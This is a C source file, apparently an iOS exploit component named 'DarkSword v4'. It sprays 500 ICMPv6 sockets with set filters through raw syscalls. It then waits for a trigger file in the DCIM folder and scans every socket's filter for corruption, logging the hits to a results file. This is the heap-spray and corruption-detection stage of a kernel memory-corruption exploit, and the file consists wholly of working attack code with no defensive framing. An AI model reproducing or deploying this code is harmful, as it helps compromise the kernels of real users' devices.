// DarkSword v4: Uses CFRunLoopRun (same as working Spray app)
// Creates sockets, sets up CFRunLoop timer to poll for trigger + scan
#define AF_INET6 30
#define SOCK_DGRAM 2
#define IPPROTO_ICMPV6 58
#define ICMP6_FILTER 18
#define NUM_SOCKETS 500

static long sys3(long n, long a, long b, long c) {
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x16) : "memory");
    return x0;
}
static long sys5(long n, long a, long b, long c, long d, long e) {
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    register long x4 __asm__("x4") = e;
    register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x16) : "memory");
    return x0;
}

static long sys2(long n, long a, long b) {
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x16) : "memory");
    return x0;
}
static void write_file(const char *path, const char *data, int len) {
    long fd = sys3(5/*open*/, (long)path, 0x0601/*O_WRONLY|O_CREAT|O_TRUNC*/, 0644);
    if (fd >= 0) { sys3(4/*write*/, fd, (long)data, len); sys2(6/*close*/, fd, 0); }
}
static int file_exists(const char *path) {
    char buf[256]; return sys2(338/*stat*/, (long)path, (long)buf) == 0;
}
static int itoa(int v, char *b) {
    if(v==0){b[0]='0';return 1;} int neg=0;if(v<0){neg=1;v=-v;}
    char t[12];int l=0;while(v>0){t[l++]='0'+(v%10);v/=10;}
    int p=0;if(neg)b[p++]='-';for(int i=l-1;i>=0;i--)b[p++]=t[i];return p;
}

// Globals
static int g_fds[NUM_SOCKETS];
static int g_created = 0;
static unsigned char g_filter[32];
static int g_triggered = 0;

// Timer callback — polls for trigger, scans on trigger
typedef const void* CFRunLoopTimerRef;
typedef const void* CFRunLoopTimerContext;
extern CFRunLoopTimerRef CFRunLoopTimerCreate(void*, double, double, int, int, void(*)(CFRunLoopTimerRef,void*), void*);
extern void CFRunLoopAddTimer(void*, CFRunLoopTimerRef, void*);
extern void* CFRunLoopGetCurrent(void);
extern void* kCFRunLoopDefaultMode;
extern void CFRunLoopRun(void);
extern double CFAbsoluteTimeGetCurrent(void);

static void timer_callback(CFRunLoopTimerRef timer, void *info) {
    if (g_triggered) return;

    if (file_exists("/var/mobile/Media/DCIM/nexus_trigger")) {
        g_triggered = 1;

        // SCAN all filters
        char results[4096];
        int rl = 0;
        int corrupted = 0, zeroed = 0, errors = 0;
        char *s = "SCAN\n";
        for(int i=0;s[i];i++) results[rl++]=s[i];

        for (int i = 0; i < g_created && rl < 3800; i++) {
            unsigned char cur[32];
            int optlen = 32;
            long ret = sys5(118/*getsockopt*/, g_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, (long)cur, (long)&optlen);
            if (ret < 0) { errors++; corrupted++; continue; }

            int all_ff=1, all_zero=1;
            for(int j=0;j<32;j++){
                if(cur[j]!=0xFF) all_ff=0;
                if(cur[j]!=0x00) all_zero=0;
            }

            if (all_zero) {
                results[rl++]='Z';
                rl+=itoa(i,results+rl);
                results[rl++]=':'; results[rl++]='f'; results[rl++]='d'; results[rl++]='=';
                rl+=itoa(g_fds[i],results+rl);
                results[rl++]='\n';
                corrupted++; zeroed++;
            } else if (!all_ff) {
                results[rl++]='C';
                rl+=itoa(i,results+rl);
                results[rl++]=':';
                char hex[]="0123456789abcdef";
                for(int j=0;j<8;j++){results[rl++]=hex[cur[j]>>4];results[rl++]=hex[cur[j]&0xF];}
                results[rl++]='\n';
                corrupted++;
            }
        }

        s="DONE:corrupted="; for(int i=0;s[i];i++) results[rl++]=s[i]; rl+=itoa(corrupted,results+rl);
        s=",zeroed="; for(int i=0;s[i];i++) results[rl++]=s[i]; rl+=itoa(zeroed,results+rl);
        s=",errors="; for(int i=0;s[i];i++) results[rl++]=s[i]; rl+=itoa(errors,results+rl);
        s=",total="; for(int i=0;s[i];i++) results[rl++]=s[i]; rl+=itoa(g_created,results+rl);
        results[rl++]='\n';

        write_file("/var/mobile/Media/DCIM/nexus_results", results, rl);
    }
}

int main(void) {
    // Create sockets
    for(int i=0;i<32;i++) g_filter[i]=0xFF;
    for(int i=0;i<NUM_SOCKETS;i++){
        long fd = sys3(97/*socket*/, AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
        if(fd>=0){
            sys5(105/*setsockopt*/, fd, IPPROTO_ICMPV6, ICMP6_FILTER, (long)g_filter, 32);
            g_fds[g_created++] = (int)fd;
        }
    }

    // Write status
    char status[64]; int sl=0;
    char *s="READY:"; for(int i=0;s[i];i++) status[sl++]=s[i];
    sl+=itoa(g_created,status+sl); status[sl++]='\n';
    write_file("/var/mobile/Media/DCIM/nexus_status", status, sl);

    // Set up timer (fires every 1 second)
    CFRunLoopTimerRef timer = CFRunLoopTimerCreate(
        (void*)0, CFAbsoluteTimeGetCurrent()+1.0, 1.0, 0, 0, timer_callback, (void*)0);
    CFRunLoopAddTimer(CFRunLoopGetCurrent(), timer, kCFRunLoopDefaultMode);

    // Run forever (same as Spray app)
    CFRunLoopRun();
    return 0;
}
